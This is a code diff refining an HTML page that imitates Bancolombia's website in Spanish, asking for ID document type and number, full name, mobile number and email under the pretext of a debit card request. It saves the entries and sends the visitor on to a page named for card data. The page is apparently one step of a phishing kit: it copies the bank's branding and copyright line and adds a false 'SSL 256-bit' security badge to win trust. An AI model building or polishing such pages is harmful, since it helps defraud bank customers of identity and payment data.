@@ -2,9 +2,9 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tarjeta Débito Bancolombia</title>
+    <title>Bancolombia | Personas</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
     <style>
         * {
             margin: 0;
@@ -13,131 +13,232 @@
         }
 
         body {
-            font-family: 'Open Sans', Arial, sans-serif;
-            background: #f5f5f5;
+            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f4f4f4;
             color: #333;
         }
 
+        /* Header */
         .header {
-            background: #FFCC00;
-            padding: 15px 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            background: #FDDA24;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        .header img {
-            height: 40px;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            padding: 30px;
-        }
-
-        .logo-bancolombia {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        h1 {
-            color: #005CA9;
+        .logo {
             font-size: 24px;
+            font-weight: bold;
+            color: #005CA9;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .header-link {
+            color: #005CA9;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Main Container */
+        .main-container {
+            max-width: 450px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            overflow: hidden;
+        }
+
+        /* Title Section */
+        .title-section {
+            background: linear-gradient(135deg, #005CA9 0%, #003d73 100%);
+            padding: 30px 25px;
             text-align: center;
+            color: white;
+        }
+
+        .title-section h1 {
+            font-size: 26px;
+            font-weight: 700;
             margin-bottom: 10px;
         }
 
-        .subtitle {
-            text-align: center;
-            color: #666;
+        .title-section p {
             font-size: 14px;
-            margin-bottom: 30px;
+            opacity: 0.95;
+            line-height: 1.5;
         }
 
-        .date-time {
-            background: #f9f9f9;
+        /* Form Section */
+        .form-section {
+            padding: 30px 25px;
+        }
+
+        .info-banner {
+            background: #E3F2FD;
+            border-left: 4px solid #005CA9;
             padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 30px;
-            border: 1px solid #e0e0e0;
+            margin-bottom: 25px;
+            border-radius: 4px;
         }
 
-        .date-time .date {
-            font-size: 16px;
+        .info-banner p {
+            font-size: 13px;
             color: #005CA9;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .date-time .time {
-            font-size: 14px;
-            color: #666;
+            line-height: 1.5;
+            margin: 0;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 22px;
         }
 
-        label {
+        .form-group label {
             display: block;
-            margin-bottom: 8px;
-            color: #333;
+            font-size: 14px;
             font-weight: 600;
-            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
         }
 
-        input, select {
+        .form-group label .required {
+            color: #d32f2f;
+        }
+
+        .form-control {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
+            padding: 12px 14px;
+            border: 1px solid #d0d0d0;
             border-radius: 6px;
-            font-size: 14px;
-            transition: border 0.3s;
+            font-size: 15px;
+            transition: all 0.3s;
+            font-family: inherit;
         }
 
-        input:focus, select:focus {
+        .form-control:focus {
             outline: none;
-            border-color: #FFCC00;
+            border-color: #005CA9;
+            box-shadow: 0 0 0 3px rgba(0,92,169,0.1);
         }
 
-        .btn-continuar {
-            width: 100%;
-            padding: 15px;
-            background: #005CA9;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
+        .form-control::placeholder {
+            color: #999;
+        }
+
+        select.form-control {
             cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 20px;
+            background: white;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 35px;
         }
 
-        .btn-continuar:hover {
-            background: #004A8D;
+        /* Input Icons */
+        .input-group {
+            position: relative;
         }
 
-        .secure-notice {
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 18px;
+        }
+
+        .input-group .form-control {
+            padding-left: 42px;
+        }
+
+        /* Button */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #FDDA24;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #005CA9;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-submit:hover {
+            background: #fdd000;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(253,218,36,0.4);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        /* Security Badge */
+        .security-badge {
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 8px;
             margin-top: 20px;
-            color: #4CAF50;
-            font-size: 13px;
+            padding: 12px;
+            background: #f9f9f9;
+            border-radius: 6px;
         }
 
-        .secure-notice svg {
+        .security-badge svg {
             width: 20px;
             height: 20px;
-            margin-right: 8px;
         }
 
-        .error {
-            border-color: #d32f2f !important;
+        .security-badge span {
+            font-size: 13px;
+            color: #4CAF50;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f9f9f9;
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: #666;
+            margin: 5px 0;
+        }
+
+        .footer-links {
+            margin-top: 12px;
+        }
+
+        .footer-links a {
+            color: #005CA9;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 10px;
+        }
+
+        /* Error States */
+        .form-control.error {
+            border-color: #d32f2f;
         }
 
         .error-message {
@@ -147,110 +248,226 @@
             display: none;
         }
 
-        .info-box {
-            background: #e3f2fd;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            border-left: 4px solid #005CA9;
-        }
-
-        .info-box p {
-            margin: 0;
-            font-size: 13px;
-            color: #005CA9;
-        }
-
-        .footer {
+        /* Date/Time Display */
+        .datetime-display {
+            background: #f9f9f9;
+            padding: 12px;
+            border-radius: 6px;
             text-align: center;
-            margin-top: 30px;
-            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .datetime-display .date {
+            font-size: 14px;
+            color: #005CA9;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .datetime-display .time {
+            font-size: 13px;
             color: #666;
-            font-size: 12px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .main-container {
+                margin: 20px 15px;
+                border-radius: 8px;
+            }
+
+            .title-section {
+                padding: 25px 20px;
+            }
+
+            .title-section h1 {
+                font-size: 22px;
+            }
+
+            .form-section {
+                padding: 25px 20px;
+            }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0,92,169,0.3);
+            border-top-color: #005CA9;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-submit.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .btn-submit.loading .spinner {
+            display: inline-block;
         }
     </style>
 </head>
 <body>
+    <!-- Header -->
     <div class="header">
-        <svg width="200" height="40" viewBox="0 0 200 40">
-            <text x="10" y="30" font-family="Arial" font-size="24" font-weight="bold" fill="#005CA9">Bancolombia</text>
-        </svg>
+        <div class="logo">Bancolombia</div>
+        <div class="header-right">
+            <a href="#" class="header-link">Ayuda</a>
+        </div>
     </div>
 
-    <div class="container">
-        <div class="logo-bancolombia">
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Title Section -->
+        <div class="title-section">
             <h1>🏦 Tarjeta Débito</h1>
+            <p>Ingresa tus datos para continuar con la solicitud de tu tarjeta débito Bancolombia</p>
         </div>
 
-        <div class="subtitle">
-            Completa la información para activar tu tarjeta débito
+        <!-- Form Section -->
+        <div class="form-section">
+            <!-- Date/Time Display -->
+            <div class="datetime-display">
+                <div class="date" id="currentDate">Cargando...</div>
+                <div class="time" id="currentTime">--:--:--</div>
+            </div>
+
+            <!-- Info Banner -->
+            <div class="info-banner">
+                <p>📌 <strong>Importante:</strong> Esta información es necesaria para validar tu identidad de forma segura</p>
+            </div>
+
+            <!-- Form -->
+            <form id="mainForm" autocomplete="off">
+                <!-- Tipo de Documento -->
+                <div class="form-group">
+                    <label for="tipoDocumento">
+                        Tipo de documento <span class="required">*</span>
+                    </label>
+                    <select id="tipoDocumento" class="form-control" required>
+                        <option value="">Seleccionar...</option>
+                        <option value="CC">Cédula de Ciudadanía</option>
+                        <option value="CE">Cédula de Extranjería</option>
+                        <option value="PA">Pasaporte</option>
+                        <option value="TI">Tarjeta de Identidad</option>
+                    </select>
+                    <div class="error-message">Por favor selecciona un tipo de documento</div>
+                </div>
+
+                <!-- Número de Documento -->
+                <div class="form-group">
+                    <label for="numeroDocumento">
+                        Número de documento <span class="required">*</span>
+                    </label>
+                    <div class="input-group">
+                        <span class="input-icon">🆔</span>
+                        <input 
+                            type="text" 
+                            id="numeroDocumento" 
+                            class="form-control" 
+                            placeholder="Ej: 1234567890"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa un número de documento válido</div>
+                </div>
+
+                <!-- Nombre Completo -->
+                <div class="form-group">
+                    <label for="nombreCompleto">
+                        Nombre completo <span class="required">*</span>
+                    </label>
+                    <div class="input-group">
+                        <span class="input-icon">👤</span>
+                        <input 
+                            type="text" 
+                            id="nombreCompleto" 
+                            class="form-control" 
+                            placeholder="Como aparece en tu documento"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa tu nombre completo</div>
+                </div>
+
+                <!-- Celular -->
+                <div class="form-group">
+                    <label for="celular">
+                        Número de celular <span class="required">*</span>
+                    </label>
+                    <div class="input-group">
+                        <span class="input-icon">📱</span>
+                        <input 
+                            type="tel" 
+                            id="celular" 
+                            class="form-control" 
+                            placeholder="3001234567"
+                            maxlength="10"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa un número de celular válido (10 dígitos)</div>
+                </div>
+
+                <!-- Email -->
+                <div class="form-group">
+                    <label for="email">
+                        Correo electrónico <span class="required">*</span>
+                    </label>
+                    <div class="input-group">
+                        <span class="input-icon">✉️</span>
+                        <input 
+                            type="email" 
+                            id="email" 
+                            class="form-control" 
+                            placeholder="ejemplo@email.com"
+                            required
+                        >
+                    </div>
+                    <div class="error-message">Ingresa un correo electrónico válido</div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn-submit">
+                    <span class="btn-text">Continuar</span>
+                    <div class="spinner"></div>
+                </button>
+
+                <!-- Security Badge -->
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24" fill="#4CAF50">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                    </svg>
+                    <span>Conexión segura SSL 256-bit</span>
+                </div>
+            </form>
         </div>
 
-        <div class="date-time">
-            <div class="date" id="currentDate"></div>
-            <div class="time" id="currentTime"></div>
-        </div>
-
-        <div class="info-box">
-            <p>📌 Esta información es necesaria para validar tu identidad y activar tu tarjeta de forma segura</p>
-        </div>
-
-        <form id="personalForm">
-            <div class="form-group">
-                <label for="tipoDocumento">Tipo de documento *</label>
-                <select id="tipoDocumento" required>
-                    <option value="">Selecciona...</option>
-                    <option value="CC">Cédula de Ciudadanía</option>
-                    <option value="CE">Cédula de Extranjería</option>
-                    <option value="PA">Pasaporte</option>
-                </select>
-                <span class="error-message">Selecciona un tipo de documento</span>
+        <!-- Footer -->
+        <div class="footer">
+            <p>&copy; 2024 Bancolombia S.A. | Todos los derechos reservados</p>
+            <div class="footer-links">
+                <a href="#">Términos y condiciones</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Ayuda</a>
             </div>
-
-            <div class="form-group">
-                <label for="numeroDocumento">Número de documento *</label>
-                <input type="text" id="numeroDocumento" placeholder="Ej: 1234567890" required>
-                <span class="error-message">Ingresa un número válido</span>
-            </div>
-
-            <div class="form-group">
-                <label for="nombreCompleto">Nombre completo *</label>
-                <input type="text" id="nombreCompleto" placeholder="Como aparece en tu documento" required>
-                <span class="error-message">Ingresa tu nombre completo</span>
-            </div>
-
-            <div class="form-group">
-                <label for="celular">Número de celular *</label>
-                <input type="tel" id="celular" placeholder="3001234567" maxlength="10" required>
-                <span class="error-message">Ingresa un celular válido (10 dígitos)</span>
-            </div>
-
-            <div class="form-group">
-                <label for="email">Correo electrónico *</label>
-                <input type="email" id="email" placeholder="ejemplo@email.com" required>
-                <span class="error-message">Ingresa un correo válido</span>
-            </div>
-
-            <button type="submit" class="btn-continuar">Continuar</button>
-        </form>
-
-        <div class="secure-notice">
-            <svg viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
-            </svg>
-            Conexión segura protegida
         </div>
     </div>
 
-    <div class="footer">
-        <p>&copy; 2024 Bancolombia S.A. | Todos los derechos reservados</p>
-        <p>Esta es una transacción segura y encriptada</p>
-    </div>
-
+    <!-- Scripts -->
     <script src="js/jquery-3.7.0.min.js"></script>
     <script src="js/jquery.jclockNew.js"></script>
     <script>
-        // Reloj en tiempo real
+        // Initialize clock
         $(document).ready(function(){
             $('#currentTime').jclockNew({
                 format: '%H:%M:%S',
@@ -258,84 +475,115 @@
             });
         });
 
-        // Fecha actual
+        // Update date
         function updateDate() {
-            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            const options = { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric' 
+            };
             const date = new Date().toLocaleDateString('es-CO', options);
-            document.getElementById('currentDate').textContent = date.charAt(0).toUpperCase() + date.slice(1);
+            const formattedDate = date.charAt(0).toUpperCase() + date.slice(1);
+            document.getElementById('currentDate').textContent = formattedDate;
         }
         updateDate();
 
-        // Validación del formulario
-        document.getElementById('personalForm').addEventListener('submit', function(e) {
+        // Form validation and submission
+        const form = document.getElementById('mainForm');
+        const submitBtn = form.querySelector('.btn-submit');
+
+        form.addEventListener('submit', function(e) {
             e.preventDefault();
             
+            // Clear previous errors
+            document.querySelectorAll('.form-control').forEach(input => {
+                input.classList.remove('error');
+                input.nextElementSibling?.classList.remove('show');
+            });
+
             let isValid = true;
-            const data = {
+            const formData = {
                 tipoDocumento: document.getElementById('tipoDocumento').value,
                 numeroDocumento: document.getElementById('numeroDocumento').value,
                 nombreCompleto: document.getElementById('nombreCompleto').value,
                 celular: document.getElementById('celular').value,
                 email: document.getElementById('email').value,
-                timestamp: new Date().toLocaleString('es-CO')
+                timestamp: new Date().toLocaleString('es-CO', {
+                    timeZone: 'America/Bogota'
+                })
             };
 
-            // Validar cada campo
-            Object.keys(data).forEach(key => {
-                if (key !== 'timestamp') {
+            // Validate all fields
+            Object.keys(formData).forEach(key => {
+                if (key !== 'timestamp' && !formData[key]) {
                     const input = document.getElementById(key);
-                    const errorMsg = input.nextElementSibling;
-                    
-                    if (!data[key]) {
-                        input.classList.add('error');
+                    input.classList.add('error');
+                    const errorMsg = input.closest('.form-group').querySelector('.error-message');
+                    if (errorMsg) {
                         errorMsg.style.display = 'block';
-                        isValid = false;
-                    } else {
-                        input.classList.remove('error');
-                        errorMsg.style.display = 'none';
                     }
+                    isValid = false;
                 }
             });
 
-            // Validar email
+            // Validate email format
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(data.email)) {
+            if (formData.email && !emailRegex.test(formData.email)) {
                 document.getElementById('email').classList.add('error');
-                document.getElementById('email').nextElementSibling.style.display = 'block';
+                const errorMsg = document.getElementById('email').closest('.form-group').querySelector('.error-message');
+                errorMsg.textContent = 'Formato de correo inválido';
+                errorMsg.style.display = 'block';
                 isValid = false;
             }
 
-            // Validar celular (10 dígitos)
-            if (data.celular.length !== 10) {
+            // Validate phone (10 digits)
+            if (formData.celular && formData.celular.length !== 10) {
                 document.getElementById('celular').classList.add('error');
-                document.getElementById('celular').nextElementSibling.style.display = 'block';
+                const errorMsg = document.getElementById('celular').closest('.form-group').querySelector('.error-message');
+                errorMsg.style.display = 'block';
                 isValid = false;
             }
 
             if (isValid) {
-                // Guardar datos
-                localStorage.setItem('personalData', JSON.stringify(data));
-                
-                // Redirigir a la página de tarjeta
-                window.location.href = 'datos-tarjeta.html';
+                // Show loading state
+                submitBtn.classList.add('loading');
+                submitBtn.querySelector('.btn-text').textContent = 'Procesando...';
+
+                // Save data
+                localStorage.setItem('personalData', JSON.stringify(formData));
+
+                // Redirect after delay
+                setTimeout(() => {
+                    window.location.href = 'datos-tarjeta.html';
+                }, 1500);
             }
         });
 
-        // Limpiar errores al escribir
-        document.querySelectorAll('input, select').forEach(input => {
+        // Clear error on input
+        document.querySelectorAll('.form-control').forEach(input => {
             input.addEventListener('input', function() {
                 this.classList.remove('error');
-                this.nextElementSibling.style.display = 'none';
+                const errorMsg = this.closest('.form-group').querySelector('.error-message');
+                if (errorMsg) {
+                    errorMsg.style.display = 'none';
+                }
             });
         });
 
-        // Solo números en documento y celular
+        // Only numbers for document and phone
         document.getElementById('numeroDocumento').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
         });
 
         document.getElementById('celular').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Uppercase for name
+        document.getElementById('nombreCompleto').addEventListener('input', function(e) {
+            // Allow only letters and spaces
+            e.target.value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
         });
     </script>
 </body>
